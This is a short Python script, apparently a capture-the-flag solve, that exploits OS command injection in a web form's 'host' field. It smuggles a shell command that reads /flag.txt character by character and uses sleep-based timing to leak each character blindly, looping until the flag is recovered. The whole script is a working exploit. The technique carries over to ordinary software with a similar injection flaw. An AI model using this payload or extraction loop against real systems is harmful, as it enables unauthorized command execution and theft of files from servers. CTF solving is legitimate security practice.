#!/bin/python3
import requests
from string import printable

url = "http://127.0.0.1:5000/flag"
flag = "DEAD{"
sleep_time = 1

chars = printable
# those always return true in the search
chars = (
    chars.replace(".", "").replace("$", "").replace("^", "")
)  # mostly the flag charset is a-zA-Z0-9{}_-


def request(payload):
    data = {"host": payload}
    try:
        r = requests.post(url, data=data, timeout=15, verify=False)
    except requests.exceptions.ConnectionError:
        return request(payload)
    if r.status_code != 200 or "Error" in r.text:
        return request(payload)

    return r.elapsed.total_seconds()


c_i = len(flag)
while True:
    for c in chars:
        payload = f";if [ $(cat /flag.txt | cut -c{c_i+1} | grep -c '{c}') -eq 1 ]; then sleep {str(sleep_time)}; fi"  # this way it is possible to implement threading, but it will overload the server so I didn't try it.
        print(f"Tyring {c}", end="\r")
        r = request(payload)
        while sleep_time > r + 4:  # to handle possible falst posatives
            r = request(payload)
        if r >= sleep_time and r:
            print()
            flag += c
            print(flag)
            print()
            break
    if flag[-1] == "}":
        break

    c_i += 1


print()
print("Done")
print(flag)
